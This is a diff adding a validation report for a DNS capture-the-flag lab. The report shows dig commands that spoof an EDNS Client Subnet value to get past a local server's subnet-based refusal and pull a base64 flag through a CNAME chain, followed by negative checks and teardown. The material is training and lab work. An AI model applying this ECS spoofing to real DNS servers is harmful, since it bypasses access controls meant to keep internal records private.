@@ -1,0 +1,32 @@
+# Validation report — dns-ecs-bypass
+
+## Environment
+
+- Kali Linux, Docker Compose v2.
+- Build: `docker compose up -d --build` from a clean clone of the lab
+  directory.
+
+## Checks run
+
+| Step | Command | Result |
+|---|---|---|
+| Build | `docker compose up -d --build` | container starts, logs show `DNS CTF server listening on udp/5353` |
+| Baseline | `dig @127.0.0.1 -p 5353 flag.ctf.local` | `REFUSED` |
+| Bypass | `dig @127.0.0.1 -p 5353 flag.ctf.local +subnet=10.10.10.0/24` | `CNAME` to internal name returned |
+| Chain | `dig @127.0.0.1 -p 5353 <cname-target> +subnet=10.10.10.0/24` | `TXT` with base64 payload returned |
+| Decode | `base64 -d` on the TXT value | matches the lab's intended flag |
+| Solve check | `python3 scripts/check.py labs/network/dns-ecs-bypass` with the decoded flag | `solved` |
+| Structure | `python3 scripts/validate.py` | clean, no errors |
+| Compose contract | `python3 scripts/validate.py --compose` | clean, no errors |
+
+## Negative checks
+
+- Query without ECS from outside the trusted subnet: refused, as expected.
+- Query with an ECS subnet outside `10.10.10.0/24`: refused, as expected.
+- Malformed/truncated UDP packets: server logs the exception and keeps
+  listening; no crash observed.
+
+## Teardown
+
+- `docker compose down` removes the container and the dedicated network
+  cleanly.
